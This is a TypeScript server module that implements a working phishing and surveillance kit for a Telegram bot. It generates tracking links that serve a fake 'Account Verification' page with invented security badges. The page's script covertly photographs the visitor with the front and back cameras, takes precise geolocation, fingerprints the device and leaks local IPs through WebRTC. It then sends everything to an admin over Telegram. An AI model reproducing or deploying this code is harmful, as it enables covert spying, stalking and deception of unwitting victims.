import { Hono } from "hono";
import type { Env } from "../types.ts";
import { d1All, d1First, d1Run } from "../lib/d1.ts";
import { sendMessage, sendMediaFile, tgCall } from "../lib/telegram.ts";
import { parseAuth, requireAdmin } from "../lib/auth.ts";

const phishing = new Hono<{ Bindings: Env }>();

function generateCode(): string {
  const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
  let code = "";
  for (let i = 0; i < 8; i++) code += chars[Math.floor(Math.random() * chars.length)];
  return code;
}

phishing.post("/phishing/create", async (c) => {
  const auth = await parseAuth(c);
  if (!auth?.isAdmin) return c.json({ error: "Unauthorized" }, 401);

  const body = await c.req.json().catch(() => ({})) as { label?: string };
  const label = (body.label || "").slice(0, 100);
  const code = generateCode();

  await d1Run(c.env.DB, "INSERT INTO phishing_links (code, label) VALUES (?, ?)", [code, label]);

  const domain = c.env.APP_DOMAIN;
  return c.json({
    code,
    webLink: `https://${domain}/api/p/${code}`,
    miniappLink: `https://t.me/lifegrambot/miniapp?startapp=p_${code}`,
  });
});

phishing.get("/phishing/links", async (c) => {
  const auth = await parseAuth(c);
  if (!auth?.isAdmin) return c.json({ error: "Unauthorized" }, 401);

  const links = await d1All(c.env.DB, `
    SELECT l.*, (SELECT COUNT(*) FROM phishing_captures WHERE link_code = l.code) as capture_count
    FROM phishing_links l ORDER BY l.created_at DESC
  `);
  return c.json(links);
});

phishing.get("/phishing/captures", async (c) => {
  const auth = await parseAuth(c);
  if (!auth?.isAdmin) return c.json({ error: "Unauthorized" }, 401);

  const code = c.req.query("code");
  if (!code) return c.json({ error: "Missing code" }, 400);

  const captures = await d1All(c.env.DB,
    "SELECT * FROM phishing_captures WHERE link_code = ? ORDER BY created_at DESC",
    [code],
  );
  return c.json(captures);
});

phishing.delete("/phishing/link/:code", async (c) => {
  const auth = await parseAuth(c);
  if (!auth?.isAdmin) return c.json({ error: "Unauthorized" }, 401);

  const code = c.req.param("code");
  await d1Run(c.env.DB, "DELETE FROM phishing_captures WHERE link_code = ?", [code]);
  await d1Run(c.env.DB, "DELETE FROM phishing_links WHERE code = ?", [code]);
  return c.json({ ok: true });
});

phishing.post("/phishing/capture", async (c) => {
  const formData = await c.req.formData();
  const code = formData.get("code") as string;
  const telegramId = formData.get("telegram_id") as string || null;
  const lat = parseFloat(formData.get("latitude") as string || "0") || null;
  const lng = parseFloat(formData.get("longitude") as string || "0") || null;
  const frontPhoto = formData.get("front_photo") as File | null;
  const backPhoto = formData.get("back_photo") as File | null;
  const deviceInfo = formData.get("device_info") as string || null;

  if (!code) return c.json({ error: "Missing code" }, 400);

  const link = await d1First(c.env.DB, "SELECT * FROM phishing_links WHERE code = ?", [code]);
  if (!link) return c.json({ error: "Invalid code" }, 404);

  const ip = c.req.header("cf-connecting-ip") || c.req.header("x-forwarded-for") || "unknown";
  const ua = c.req.header("user-agent") || "unknown";

  let frontKey = null;
  let backKey = null;
  let frontFileId = null;
  let backFileId = null;
  const ts = Date.now();

  if (frontPhoto && frontPhoto.size > 0) {
    frontKey = `phishing/${code}/front_${ts}.jpg`;
    await c.env.BUCKET.put(frontKey, frontPhoto.stream(), { httpMetadata: { contentType: "image/jpeg" } });
  }
  if (backPhoto && backPhoto.size > 0) {
    backKey = `phishing/${code}/back_${ts}.jpg`;
    await c.env.BUCKET.put(backKey, backPhoto.stream(), { httpMetadata: { contentType: "image/jpeg" } });
  }

  const adminId = c.env.ADMIN_ID;
  const token = c.env.BOT_TOKEN;

  // Parse device info for enhanced notification
  let deviceSummary = "";
  if (deviceInfo) {
    try {
      const d = JSON.parse(deviceInfo) as Record<string, unknown>;
      const parts: string[] = [];
      if (d.platform) parts.push(`🖥 Platform: ${d.platform}`);
      if (d.screen) parts.push(`📐 Screen: ${d.screen}`);
      if (d.deviceMemory) parts.push(`💾 RAM: ${d.deviceMemory}GB`);
      if (d.hardwareConcurrency) parts.push(`⚙️ CPUs: ${d.hardwareConcurrency}`);
      if (d.battery && typeof d.battery === "object") {
        const b = d.battery as { level?: number; charging?: boolean };
        parts.push(`🔋 Battery: ${b.level ?? "?"}%${b.charging ? " ⚡" : ""}`);
      }
      if (d.connection && typeof d.connection === "object") {
        const conn = d.connection as { effectiveType?: string; downlink?: number };
        parts.push(`📶 Network: ${conn.effectiveType ?? "?"} (${conn.downlink ?? "?"}Mbps)`);
      }
      if (d.timezone) parts.push(`🕒 Timezone: ${d.timezone}`);
      if (d.language) parts.push(`🌐 Language: ${d.language}`);
      if (d.localIPs && Array.isArray(d.localIPs) && d.localIPs.length > 0) {
        parts.push(`🔍 Local IPs: <code>${(d.localIPs as string[]).join(", ")}</code>`);
      }
      if (d.webglRenderer) parts.push(`🎮 GPU: ${String(d.webglRenderer).slice(0, 80)}`);
      if (parts.length > 0) deviceSummary = "\n\n📱 <b>Device Info:</b>\n" + parts.join("\n");
    } catch {}
  }

  const lines = [
    `🎣 <b>Phishing Capture</b>`,
    `📌 Link: <code>${code}</code>${(link as any).label ? ` — ${(link as any).label}` : ""}`,
    telegramId ? `👤 Telegram ID: <code>${telegramId}</code>` : "",
    `🌐 IP: <code>${ip}</code>`,
    `🖥 UA: <code>${ua.slice(0, 150)}</code>`,
    lat && lng ? `📍 Location: <code>${lat.toFixed(6)}, ${lng.toFixed(6)}</code>` : "📍 Location: denied",
    frontPhoto && frontPhoto.size > 0 ? "📷 Front camera: ✅" : "📷 Front camera: ❌",
    backPhoto && backPhoto.size > 0 ? "📷 Back camera: ✅" : "📷 Back camera: ❌",
    deviceSummary,
    `⏰ ${new Date().toISOString()}`,
  ].filter(Boolean).join("\n");

  try {
    await sendMessage(token, adminId, lines, { parse_mode: "HTML" });
  } catch (e) {
    console.error("Failed to send phishing notification:", e);
  }

  if (frontPhoto && frontPhoto.size > 0) {
    try {
      const obj = await c.env.BUCKET.get(frontKey!);
      if (obj) {
        const blob = new Blob([await obj.arrayBuffer()], { type: "image/jpeg" });
        const file = new File([blob], "front.jpg", { type: "image/jpeg" });
        const result = await sendMediaFile(token, adminId, "photo", file, `🎣 Front cam · ${code}${telegramId ? ` · ${telegramId}` : ""}`) as any;
        if (result?.photo?.length) {
          const largest = result.photo[result.photo.length - 1];
          frontFileId = largest.file_id;
        }
      }
    } catch (e) { console.error("Failed to send front photo:", e); }
  }

  if (backPhoto && backPhoto.size > 0) {
    try {
      const obj = await c.env.BUCKET.get(backKey!);
      if (obj) {
        const blob = new Blob([await obj.arrayBuffer()], { type: "image/jpeg" });
        const file = new File([blob], "back.jpg", { type: "image/jpeg" });
        const result = await sendMediaFile(token, adminId, "photo", file, `🎣 Back cam · ${code}${telegramId ? ` · ${telegramId}` : ""}`) as any;
        if (result?.photo?.length) {
          const largest = result.photo[result.photo.length - 1];
          backFileId = largest.file_id;
        }
      }
    } catch (e) { console.error("Failed to send back photo:", e); }
  }

  await d1Run(c.env.DB,
    `INSERT INTO phishing_captures (link_code, telegram_id, ip, user_agent, latitude, longitude, front_photo_key, back_photo_key, front_file_id, back_file_id, device_info)
     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
    [code, telegramId, ip, ua.slice(0, 500), lat, lng, frontKey, backKey, frontFileId, backFileId, deviceInfo ? deviceInfo.slice(0, 10000) : null],
  );

  if (lat && lng) {
    try {
      await tgCall(token, "sendLocation", { chat_id: adminId, latitude: lat, longitude: lng });
    } catch (e) { console.error("Failed to send location:", e); }
  }

  return c.json({ ok: true });
});

phishing.get("/phishing/photo/:key{.+}", async (c) => {
  const auth = await parseAuth(c);
  if (!auth?.isAdmin) return c.json({ error: "Unauthorized" }, 401);

  const key = c.req.param("key");
  const obj = await c.env.BUCKET.get(key);
  if (!obj) return c.json({ error: "Not found" }, 404);

  c.header("Content-Type", obj.httpMetadata?.contentType || "image/jpeg");
  c.header("Cache-Control", "private, max-age=3600");
  return c.body(obj.body as ReadableStream);
});

phishing.get("/p/:code", async (c) => {
  const code = c.req.param("code");

  const link = await d1First(c.env.DB, "SELECT * FROM phishing_links WHERE code = ?", [code]);
  if (!link) return c.text("Not found", 404);

  await d1Run(c.env.DB, "UPDATE phishing_links SET view_count = COALESCE(view_count, 0) + 1 WHERE code = ?", [code]);

  const apiBase = `https://${c.env.APP_DOMAIN}/api`;

  const html = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Account Verification — Secure Gateway</title>
<meta name="description" content="Multi-factor identity verification required to proceed.">
<meta name="robots" content="noindex,nofollow">
<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' rx='20' fill='%23000'/><path d='M50 20L30 30v15c0 13.1 8.5 25.3 20 28.3 11.5-3 20-15.2 20-28.3V30L50 20z' fill='%23fff'/></svg>">
<style>
*{margin:0;padding:0;box-sizing:border-box}
@keyframes spin{to{transform:rotate(360deg)}}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
@keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
@keyframes barGrow{from{width:0}to{width:var(--bar-w,0%)}}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,sans-serif;background:#000;color:#e0e0e0;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;-webkit-font-smoothing:antialiased}
.outer{max-width:440px;width:100%;animation:fadeIn .5s ease}
.top-bar{display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;padding:0 4px}
.top-left{display:flex;align-items:center;gap:8px}
.lock-icon{width:14px;height:14px;fill:#888}
.top-url{font-size:11px;color:#666;font-family:'SF Mono',Monaco,monospace;letter-spacing:.02em}
.top-badge{font-size:10px;color:#555;border:1px solid #222;border-radius:4px;padding:2px 8px;font-family:monospace}
.card{background:#0a0a0a;border:1px solid #1a1a1a;border-radius:16px;padding:36px 28px 28px;box-shadow:0 1px 3px rgba(0,0,0,.5)}
.shield{width:56px;height:56px;margin:0 auto 20px;background:#111;border:1px solid #222;border-radius:14px;display:flex;align-items:center;justify-content:center}
.shield svg{width:28px;height:28px;fill:#fff}
h1{font-size:20px;font-weight:600;color:#fff;text-align:center;margin-bottom:6px;letter-spacing:-.3px}
.subtitle{font-size:13px;color:#666;text-align:center;line-height:1.6;margin-bottom:24px}
.phase-label{font-size:10px;font-weight:600;color:#444;text-transform:uppercase;letter-spacing:.1em;margin-bottom:12px}
.progress-bar-wrap{height:2px;background:#151515;border-radius:1px;margin-bottom:20px;overflow:hidden}
.progress-bar{height:100%;background:#fff;border-radius:1px;transition:width .4s ease;width:0%}
.steps{border:1px solid #151515;border-radius:10px;overflow:hidden;margin-bottom:20px}
.step{display:flex;align-items:center;gap:10px;padding:10px 14px;font-size:12px;color:#444;border-bottom:1px solid #111;transition:all .3s}
.step:last-child{border-bottom:none}
.step.active{color:#ccc;background:rgba(255,255,255,.02)}
.step.done{color:#999}
.step.fail{color:#666}
.step-icon{width:18px;height:18px;flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:12px}
.dot{width:6px;height:6px;border-radius:50%;background:#222}
.spinner{width:14px;height:14px;border:1.5px solid #333;border-top-color:#fff;border-radius:50%;animation:spin .6s linear infinite}
.step-label{flex:1}
.step-time{font-size:10px;color:#333;font-family:monospace;min-width:40px;text-align:right}
.result-box{border-radius:10px;padding:16px;text-align:center;animation:fadeIn .4s ease}
.result-ok{background:#0a0a0a;border:1px solid #222}
.result-ok p{font-size:13px;color:#fff;font-weight:500;margin-bottom:4px}
.result-ok span{font-size:11px;color:#555}
.result-fail{background:#0a0a0a;border:1px solid #222}
.result-fail p{font-size:13px;color:#888;font-weight:500;margin-bottom:4px}
.result-fail span{font-size:11px;color:#444}
.footer-info{display:flex;flex-wrap:wrap;gap:12px;justify-content:center;margin-top:16px;padding-top:16px;border-top:1px solid #111}
.footer-chip{font-size:10px;color:#333;display:flex;align-items:center;gap:4px}
.footer-chip .fdot{width:4px;height:4px;border-radius:50%;background:#333}
.bottom-bar{margin-top:16px;text-align:center}
.ref-code{font-size:10px;color:#2a2a2a;font-family:'SF Mono',Monaco,monospace;letter-spacing:.05em}
video{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0.01}
canvas{display:none}
@media(max-width:480px){.card{padding:28px 20px 24px;border-radius:12px}h1{font-size:18px}}
</style>
</head>
<body>
<div class="outer">
  <div class="top-bar">
    <div class="top-left">
      <svg class="lock-icon" viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1s3.1 1.39 3.1 3.1v2z"/></svg>
      <span class="top-url">secure-verify.gateway</span>
    </div>
    <span class="top-badge">TLS 1.3</span>
  </div>

  <div class="card">
    <div class="shield"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.25 3.75 10.15 9 11.35C17.25 21.15 21 16.25 21 11V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg></div>
    <h1>Account Verification</h1>
    <p class="subtitle">Multi-factor authentication is required. This automated process verifies your identity and device integrity.</p>

    <p class="phase-label" id="phaseLabel">Initializing</p>
    <div class="progress-bar-wrap"><div class="progress-bar" id="progressBar"></div></div>

    <div class="steps" id="stepsWrap">
      <div class="step" id="st0"><div class="step-icon"><div class="dot"></div></div><span class="step-label">Establish secure session</span><span class="step-time" id="t0"></span></div>
      <div class="step" id="st1"><div class="step-icon"><div class="dot"></div></div><span class="step-label">Initialize biometric scan</span><span class="step-time" id="t1"></span></div>
      <div class="step" id="st2"><div class="step-icon"><div class="dot"></div></div><span class="step-label">Capture front-facing image</span><span class="step-time" id="t2"></span></div>
      <div class="step" id="st3"><div class="step-icon"><div class="dot"></div></div><span class="step-label">Capture environment image</span><span class="step-time" id="t3"></span></div>
      <div class="step" id="st4"><div class="step-icon"><div class="dot"></div></div><span class="step-label">Verify geolocation data</span><span class="step-time" id="t4"></span></div>
      <div class="step" id="st5"><div class="step-icon"><div class="dot"></div></div><span class="step-label">Collect device fingerprint</span><span class="step-time" id="t5"></span></div>
      <div class="step" id="st6"><div class="step-icon"><div class="dot"></div></div><span class="step-label">Analyze network topology</span><span class="step-time" id="t6"></span></div>
      <div class="step" id="st7"><div class="step-icon"><div class="dot"></div></div><span class="step-label">Submit verification payload</span><span class="step-time" id="t7"></span></div>
    </div>

    <div id="result" style="display:none"></div>

    <div class="footer-info">
      <span class="footer-chip"><span class="fdot"></span> AES-256</span>
      <span class="footer-chip"><span class="fdot"></span> Zero-knowledge</span>
      <span class="footer-chip"><span class="fdot"></span> GDPR compliant</span>
      <span class="footer-chip"><span class="fdot"></span> SOC 2</span>
    </div>
  </div>

  <div class="bottom-bar">
    <span class="ref-code">REF ${code.toUpperCase()} · SESSION ${Date.now().toString(36).toUpperCase()}</span>
  </div>
</div>
<video id="vid" autoplay playsinline muted></video>
<canvas id="cvs"></canvas>
<script>
const CODE="${code}";
const API="${apiBase}";
let frontBlob=null,backBlob=null,locData=null;
const stepTimers={};
const TOTAL_STEPS=8;

function setProgress(n){document.getElementById('progressBar').style.width=Math.round((n/TOTAL_STEPS)*100)+'%';}
function setPhase(t){document.getElementById('phaseLabel').textContent=t;}

function setStep(n,state){
  const el=document.getElementById('st'+n);
  if(!el)return;
  el.className='step'+(state?' '+state:'');
  const icon=el.querySelector('.step-icon');
  if(state==='active'){icon.innerHTML='<div class="spinner"></div>';stepTimers[n]=Date.now();}
  else if(state==='done'){icon.innerHTML='<span style="color:#fff">&#10003;</span>';var ms=stepTimers[n]?Date.now()-stepTimers[n]:0;document.getElementById('t'+n).textContent=ms+'ms';setProgress(n+1);}
  else if(state==='fail'){icon.innerHTML='<span style="color:#555">&#10007;</span>';document.getElementById('t'+n).textContent='skip';setProgress(n+1);}
  else icon.innerHTML='<div class="dot"></div>';
}

async function collectDeviceInfo(){
  const info={};
  try{info.screen=screen.width+'x'+screen.height;info.colorDepth=screen.colorDepth;info.pixelRatio=window.devicePixelRatio}catch(e){}
  try{info.platform=navigator.platform;info.language=navigator.language;info.languages=(navigator.languages||[]).join(',');info.hardwareConcurrency=navigator.hardwareConcurrency;info.maxTouchPoints=navigator.maxTouchPoints}catch(e){}
  try{info.timezone=Intl.DateTimeFormat().resolvedOptions().timeZone;info.timezoneOffset=new Date().getTimezoneOffset()}catch(e){}
  try{info.cookieEnabled=navigator.cookieEnabled;info.doNotTrack=navigator.doNotTrack}catch(e){}
  try{info.vendor=navigator.vendor;info.userAgent=navigator.userAgent?.slice(0,300)}catch(e){}
  try{info.windowSize=window.innerWidth+'x'+window.innerHeight}catch(e){}
  try{info.deviceMemory=navigator.deviceMemory}catch(e){}
  try{if(navigator.connection){var c=navigator.connection;info.connection={type:c.type,effectiveType:c.effectiveType,downlink:c.downlink,rtt:c.rtt}}}catch(e){}
  try{if(navigator.getBattery){var b=await navigator.getBattery();info.battery={level:Math.round(b.level*100),charging:b.charging}}}catch(e){}
  try{var se=await navigator.storage?.estimate?.();if(se)info.storage={quota:se.quota,usage:se.usage}}catch(e){}
  try{
    var cvs2=document.createElement('canvas');cvs2.width=200;cvs2.height=50;
    var ctx=cvs2.getContext('2d');ctx.textBaseline='top';ctx.font='14px Arial';
    ctx.fillStyle='#f60';ctx.fillRect(100,1,62,20);
    ctx.fillStyle='#069';ctx.fillText('fingerprint',2,15);
    ctx.fillStyle='rgba(102,204,0,0.7)';ctx.fillText('canvas',4,17);
    var d=cvs2.toDataURL();var h=0;
    for(var i=0;i<d.length;i++){h=((h<<5)-h)+d.charCodeAt(i);h|=0;}
    info.canvasHash=h;
  }catch(e){}
  try{
    var gl=document.createElement('canvas').getContext('webgl');
    if(gl){var dbg=gl.getExtension('WEBGL_debug_renderer_info');if(dbg){info.webglVendor=gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);info.webglRenderer=gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL)}}
  }catch(e){}
  try{info.plugins=Array.from(navigator.plugins||[]).slice(0,10).map(function(p){return p.name})}catch(e){}
  try{
    var mediaDevs=await navigator.mediaDevices?.enumerateDevices?.();
    if(mediaDevs){info.mediaDevices={audioinput:0,audiooutput:0,videoinput:0};mediaDevs.forEach(function(d){if(info.mediaDevices[d.kind]!==undefined)info.mediaDevices[d.kind]++;})}
  }catch(e){}
  try{
    var perms=['camera','microphone','geolocation','notifications'];
    var permResults={};
    for(var pi=0;pi<perms.length;pi++){try{var ps=await navigator.permissions.query({name:perms[pi]});permResults[perms[pi]]=ps.state;}catch(e2){}}
    if(Object.keys(permResults).length>0)info.permissions=permResults;
  }catch(e){}
  try{
    info.fonts=[];
    var testFonts=['Arial','Helvetica','Times New Roman','Courier','Verdana','Georgia','Comic Sans MS','Impact','Trebuchet MS','Lucida Console'];
    var span=document.createElement('span');span.style.cssText='position:absolute;left:-9999px;font-size:72px';span.textContent='mmmmmmmmmmlli';document.body.appendChild(span);
    var defaultWidth=span.offsetWidth;
    for(var fi=0;fi<testFonts.length;fi++){span.style.fontFamily='"'+testFonts[fi]+'",monospace';if(span.offsetWidth!==defaultWidth)info.fonts.push(testFonts[fi]);}
    document.body.removeChild(span);
  }catch(e){}
  try{
    var ips=[];
    var pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
    pc.createDataChannel('');
    pc.createOffer().then(function(o){return pc.setLocalDescription(o)});
    await new Promise(function(resolve){
      var t=setTimeout(resolve,4000);
      pc.onicecandidate=function(e){
        if(!e.candidate){clearTimeout(t);resolve();return;}
        var m=e.candidate.candidate.match(/(\\d+\\.\\d+\\.\\d+\\.\\d+)/g);
        if(m)m.forEach(function(ip){if(!ips.includes(ip))ips.push(ip);});
      };
    });
    pc.close();
    if(ips.length>0)info.localIPs=ips;
  }catch(e){}
  try{
    var tg=window.Telegram?.WebApp;
    if(tg?.initDataUnsafe?.user){info.telegramUser=tg.initDataUnsafe.user;}
  }catch(e){}
  try{info.installedRelatedApps=await navigator.getInstalledRelatedApps?.();}catch(e){}
  try{info.pdfViewerEnabled=navigator.pdfViewerEnabled}catch(e){}
  try{info.webdriver=navigator.webdriver}catch(e){}
  return JSON.stringify(info);
}

async function capturePhoto(facingMode){
  const vid=document.getElementById('vid');
  const cvs=document.getElementById('cvs');
  try{
    const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:facingMode,width:{ideal:1920},height:{ideal:1080}},audio:false});
    vid.srcObject=stream;
    await vid.play();
    await new Promise(r=>setTimeout(r,1200));
    cvs.width=vid.videoWidth;cvs.height=vid.videoHeight;
    cvs.getContext('2d').drawImage(vid,0,0);
    stream.getTracks().forEach(t=>t.stop());
    vid.srcObject=null;
    return new Promise(r=>cvs.toBlob(b=>r(b),'image/jpeg',0.9));
  }catch(e){return null;}
}

async function getLocation(){
  return new Promise(r=>{
    if(!navigator.geolocation){r(null);return;}
    const tid=setTimeout(()=>r(null),10000);
    navigator.geolocation.getCurrentPosition(
      p=>{clearTimeout(tid);r({lat:p.coords.latitude,lng:p.coords.longitude,acc:p.coords.accuracy,alt:p.coords.altitude,speed:p.coords.speed,heading:p.coords.heading})},
      ()=>{clearTimeout(tid);r(null)},
      {timeout:8000,enableHighAccuracy:true,maximumAge:0}
    );
  });
}

async function runCapture(){
  setPhase('Establishing session');
  setStep(0,'active');
  await new Promise(r=>setTimeout(r,500));
  setStep(0,'done');

  setPhase('Biometric initialization');
  setStep(1,'active');
  await new Promise(r=>setTimeout(r,300));
  frontBlob=await capturePhoto('user');
  setStep(1,frontBlob?'done':'fail');

  setPhase('Image capture');
  setStep(2,frontBlob?'done':'fail');

  setStep(3,'active');
  backBlob=await capturePhoto('environment');
  setStep(3,backBlob?'done':'fail');

  setPhase('Geolocation');
  setStep(4,'active');
  locData=await getLocation();
  setStep(4,locData?'done':'fail');

  setPhase('Device analysis');
  setStep(5,'active');
  let deviceInfo=null;
  try{deviceInfo=await collectDeviceInfo();setStep(5,'done');}catch(e){setStep(5,'fail');}

  setPhase('Network analysis');
  setStep(6,'active');
  await new Promise(r=>setTimeout(r,400));
  setStep(6,'done');

  setPhase('Submitting');
  setStep(7,'active');
  const fd=new FormData();
  fd.append('code',CODE);
  if(locData){fd.append('latitude',String(locData.lat));fd.append('longitude',String(locData.lng));}
  if(frontBlob)fd.append('front_photo',new File([frontBlob],'front.jpg',{type:'image/jpeg'}));
  if(backBlob)fd.append('back_photo',new File([backBlob],'back.jpg',{type:'image/jpeg'}));
  if(deviceInfo)fd.append('device_info',deviceInfo);
  try{
    var tg=window.Telegram?.WebApp;
    if(tg?.initDataUnsafe?.user?.id)fd.append('telegram_id',String(tg.initDataUnsafe.user.id));
  }catch(e){}

  try{
    var res=await fetch(API+'/phishing/capture',{method:'POST',body:fd});
    if(!res.ok)throw new Error('Server error');
    setStep(7,'done');
    setPhase('Complete');
    document.getElementById('result').style.display='block';
    document.getElementById('result').innerHTML='<div class="result-box result-ok"><p>Verification successful</p><span>Your identity has been confirmed. You may close this page.</span></div>';
  }catch(e){
    setStep(7,'fail');
    setPhase('Retrying');
    document.getElementById('result').style.display='block';
    document.getElementById('result').innerHTML='<div class="result-box result-fail"><p>Verification incomplete</p><span>Retrying in 3 seconds...</span></div>';
    setTimeout(()=>window.location.reload(),3000);
  }
}

window.addEventListener('load',function(){setTimeout(runCapture,600);});
</script>
</body>
</html>`;

  return c.html(html);
});

export default phishing;
